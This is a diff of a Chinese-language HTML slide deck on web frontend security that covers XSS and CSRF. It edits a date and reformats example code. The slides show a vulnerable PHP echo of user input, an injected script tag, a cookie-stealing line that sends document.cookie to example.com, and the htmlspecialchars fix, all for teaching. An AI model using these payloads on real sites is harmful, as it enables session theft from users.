@@ -72,7 +72,7 @@
         <section>
           <h1>浅谈 Web 前端安全</h1>
           <p>
-            <small>by 林谦 @ 2012年12月27日</small>
+            <small>by 林谦 @ 2012年12月28日</small>
           </p>
         </section>
 
@@ -81,7 +81,7 @@
           <ul>
             <li>XSS</li>
             <li>CSRF</li>
-            <li>其他</li>
+            <!-- <li>其他</li> -->
           </ul>
         </section>
 
@@ -103,8 +103,8 @@
             <h4 class="fragment">原因</h4>
             <ul class="fragment">
               <li>原样输出了来自用户的内容</li>
-              <li><pre style="resize:both"><code class="php" contenteditable>echo $_GET['tweet'];</code></pre></li>
-              <li>用户的内容:<pre style="resize:both"><code class="php" contenteditable>&lt;script src="http://demo.ued.taobao.net/linqian/tmp/xss-demo.js"&gt;&lt;/script&gt;</code></pre></li>
+              <li><pre style="resize:both"><code class="php" contenteditable>&lt;?php echo $_GET['tweet']; &gt;</code></pre></li>
+              <li>用户的内容:<pre style="resize:both"><code class="html" contenteditable>&lt;script src="http://demo.ued.taobao.net/linqian/tmp/xss-demo.js"&gt;&lt;/script&gt;</code></pre></li>
             </ul>
             <p class="fragment">真实例子: 新浪微博 xss <a href="http://coolshell.cn/articles/4914.html" target="_blank">漏洞</a></p>
           </section>
@@ -115,7 +115,10 @@
             <ul>
               <li>恶意代码作用域为被攻击页面</li>
               <li>获取用户 cookie, 然后收集起来</li>
-              <li><pre style="resize:both"><code class="html" contenteditable>(new Image()).src="http://example.com?secret=" + encodeURIComponent(document.cookie);</code></pre></li>
+              <li><pre style="resize:both"><code class="html" contenteditable>&lt;script&gt;
+(new Image()).src = "http://example.com?secret=" 
+                  + encodeURIComponent(document.cookie);
+&lt;/script&gt;</code></pre></li>
             </ul>
           </section>
 
@@ -126,7 +129,7 @@
               <li>意识: 所有来自用户的数据都是不可信的</li>
               <li>转义来自用户的数据: <span class="fragment">get, post, cookie</span></li>
               <li>用户内容中的 html 标签一定要转义为<a href="http://www.w3school.com.cn/html/html_entities.asp" target="_blank">实体字符</a></li>
-              <li><pre style="resize:both"><code class="php" contenteditable>echo htmlspecialchars($_GET['tweet']);</code></pre></li>
+              <li><pre style="resize:both"><code class="php" contenteditable>&lt;?php echo htmlspecialchars($_GET['tweet']);&gt</code></pre></li>
             </ul>
           </section>
 
@@ -213,11 +216,9 @@ document.getElementById('csrf').submit();
         </section>
 
 
-
-        <section>
-            <h2>UTF-7 漏洞</h2>
-        </section>
-
+        <!-- <section> -->
+        <!--     <h2>UTF-7 漏洞</h2> -->
+        <!-- </section> -->
 
 
         <section>
